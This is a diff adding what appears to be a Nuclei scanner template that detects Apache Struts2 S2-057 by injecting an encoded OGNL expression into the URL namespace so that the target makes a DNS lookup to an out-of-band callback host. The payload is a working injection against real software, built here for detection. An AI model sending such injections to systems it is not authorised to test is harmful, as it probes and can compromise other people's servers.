@@ -1,0 +1,28 @@
+id: s2-057-oob
+
+info:
+  name: Apache Struts2 S2-057 - Out Of Band (OOB) Detection
+  author: seal
+  severity: critical
+  description: Blind namespace injection using DNS resolution.
+  tags: safe-poc, struts2, cve, cve2018, oob
+
+http:
+  - raw:
+      - |
+        GET /%24%7b%28%40java.net.InetAddress%40getByName%28%22{{interactsh-url}}%22%29%29%7d/actionChain1.action HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+
+      - |
+        GET /struts2-showcase/%24%7b%28%40java.net.InetAddress%40getByName%28%22{{interactsh-url}}%22%29%29%7d/actionChain1.action HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
